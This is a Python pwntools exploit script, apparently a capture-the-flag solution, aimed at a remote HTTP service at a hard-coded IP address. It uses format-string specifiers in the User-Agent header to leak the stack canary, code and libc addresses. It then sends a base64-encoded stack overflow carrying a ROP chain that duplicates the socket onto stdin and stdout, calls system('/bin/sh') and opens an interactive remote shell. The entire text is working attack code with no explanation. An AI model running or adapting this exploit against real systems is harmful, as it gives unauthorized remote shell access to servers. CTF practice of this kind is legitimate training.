from pwn import *
import base64
import sys

k=int(sys.argv[1])
host="13.124.80.124"
port="12002"
#host="127.0.0.1"
#port="1337"
overflow="/bin/sh\x00"+"ccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr"
toy=base64.b64encode(overflow)
path="/?toy="+toy

request="GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %%7$p %%8$p %%9$p %%37$p\r\nConnection: keep-alive\r\n\r\n"%(path,host)


serverName=host
serverPort=int(port)
   
#clientSocket=socket(AF_INET, SOCK_STREAM)
#clientSocket.connect((serverName,serverPort))
#clientSocket.send(request)

clientSocket=remote(serverName, serverPort)
clientSocket.send(request)

data=clientSocket.recv(1024)
leak=data.split("[GET] / - ")[1].split("</")[0].split()
canary=int(leak[0],16)
stack=int(leak[1],16)
code=int(leak[2],16)
libc=int(leak[3],16)
#sh=libc+1492263
libc_start_main=libc-k
sh=libc_start_main-0x201f0+0x1619d9
#system=libc+150368
system=libc_start_main-0x201f0+0x3f480
#dup2=libc+880960
dup2=libc_start_main-0x201f0+0xdbd70
gadget1=code+239 #pop rdi, ret
gadget2=code+237 #pop rsi, pop r15, ret
print("canary: "+hex(canary)+"\nsystem: "+hex(system)+"\ndup2: "+hex(dup2)+"\nsh: "+hex(sh)+"\ngadget1: "+hex(gadget1)+"\ngadget2: "+hex(gadget2))

print(hex(libc)+" "+hex(code)+" "+hex(canary))

overflow="/bin/sh\x00"+"ccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr"+p64(canary)+p64(0xdeadbeef)+p64(gadget1)+p64(4)+p64(gadget2)+p64(0)+p64(0xdeadbeef)+p64(dup2)+p64(gadget1)+p64(4)+p64(gadget2)+p64(1)+p64(0xdeadbeef)+p64(dup2)+p64(gadget1)+p64(sh)+p64(system)
toy=base64.b64encode(overflow)
path="/?toy="+toy
request="GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %%7$p %%8$p %%9$p %%37$p\r\nConnection: keep-alive\r\n\r\n"%(path,host)

clientSocket=remote(serverName, serverPort)
#raw_input()
clientSocket.send(request+"\n")
clientSocket.interactive()